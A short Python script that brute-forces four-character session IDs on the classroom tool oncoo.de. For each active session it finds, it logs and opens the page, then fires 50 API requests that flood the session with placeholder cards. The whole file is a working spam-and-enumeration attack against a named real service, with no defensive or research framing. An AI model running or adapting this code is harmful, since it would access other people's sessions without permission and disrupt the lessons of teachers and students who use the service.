import random
import string
import webbrowser
import requests


# Generate a random string of lowercase letters and digits
def generate_random_string():
    characters = string.ascii_lowercase + string.digits
    random_string = ''.join(random.choices(characters, k=4))
    return random_string


# Continuously generate random IDs and check if they lead to specific pages
while True:
    RANDOM_ID = generate_random_string()
    URL = 'https://www.oncoo.de/t/' + RANDOM_ID
    RESPONSE = requests.get(URL)

    # Add your message here
    MESSAGE = ("Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut "
               "labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores "
               "et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem "
               "ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore "
               "et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea "
               "rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.")

    # Check if the response does not contain specific titles, indicating it's not a specific page
    if '<p>Zu Ihrer Anfrage konnten wir leider keinen passenden Inhalt finden.</p>' not in RESPONSE.text and \
            '<title>Teams</title>' not in RESPONSE.text and \
            '<title>Placement</title>' not in RESPONSE.text and \
            '<title>Evaluation</title>' not in RESPONSE.text:
        # If the page is not one of the specific ones, record the URL and open it in the web browser
        with open('found_urls.txt', 'a') as file:
            file.write(URL + '\n')
        webbrowser.open(URL)

        # Send requests to a specific API endpoint to create new cards with the previously defined text
        for _ in range(50):
            requests.get(
                f'https://www.oncoo.de/API/Kartenabfrage/API.php?funktion=4&dir={RANDOM_ID}&karte=%7B"ebene"%3A0%2C'
                f'"farbe"%3A"gruen"%2C"inhalt"%3A"{MESSAGE}"%2C"haeufigkeit"%3A1%2C"x"%3A-11%2C"y"%3A-11%2C"sichtbar'
                f'"%3Atrue%2C"schriftgroesse"%3A0%2C"schattenfarbe"%3A0%7D&token=to6o&_=1709128881085')
